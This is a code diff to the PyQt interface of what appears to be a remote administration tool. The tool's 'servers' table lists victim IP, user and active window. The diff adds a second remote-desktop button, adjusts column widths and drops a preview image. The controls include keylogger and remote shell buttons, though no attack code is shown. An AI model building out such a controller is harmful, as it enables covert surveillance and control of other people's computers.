@@ -83,6 +83,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteExplorerButton.setDisabled(True)
         self.remoteAudioButton.setDisabled(True)
         self.remoteDesktopButton.setDisabled(True)
+        self.remoteDesktopButton2.setDisabled(True)
         self.remoteKeyloggerButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.lockServerButton.setVisible(False)
@@ -99,12 +100,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_version = 5
         self.index_of_activeWindowTitle = 6
         # initialize servers table columns width
-        self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
-        self.serversTable.setColumnWidth(self.index_of_socket, 60)
-        self.serversTable.setColumnWidth(self.index_of_lock, 90)
-        self.serversTable.setColumnWidth(self.index_of_os, 100)
-        self.serversTable.setColumnWidth(self.index_of_user, 100)
-        self.serversTable.setColumnWidth(self.index_of_version, 60)
+        self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
+        self.serversTable.setColumnWidth(self.index_of_socket, 50)
+        self.serversTable.setColumnWidth(self.index_of_lock, 80)
+        self.serversTable.setColumnWidth(self.index_of_os, 90)
+        self.serversTable.setColumnWidth(self.index_of_user, 90)
+        self.serversTable.setColumnWidth(self.index_of_version, 50)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
@@ -125,6 +126,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteExplorerButton.clicked.connect(self.run_explorer)
         self.remoteAudioButton.clicked.connect(self.run_audio)
         self.remoteDesktopButton.clicked.connect(self.run_desktop)
+        self.remoteDesktopButton2.clicked.connect(self.run_desktop)
         self.remoteKeyloggerButton.clicked.connect(self.run_keylogger)
 
         # Custom signal for update server table
@@ -378,6 +380,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
                 self.remoteDesktopButton.setDisabled(True)
+                self.remoteDesktopButton2.setDisabled(True)
                 self.remoteKeyloggerButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
@@ -387,6 +390,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(False)
                 self.remoteAudioButton.setDisabled(False)
                 self.remoteDesktopButton.setDisabled(False)
+                self.remoteDesktopButton2.setDisabled(False)
                 self.remoteKeyloggerButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
@@ -399,6 +403,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteShellButton.setDisabled(True)
             self.remoteAudioButton.setDisabled(True)
             self.remoteDesktopButton.setDisabled(True)
+            self.remoteDesktopButton2.setDisabled(True)
             self.remoteKeyloggerButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
@@ -406,7 +411,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setVisible(True)
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
-            self.previewLabel.setPixmap(QPixmap(os.path.join(assets, 'monitor.png')).scaled(QSize(280, 175)))
 
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
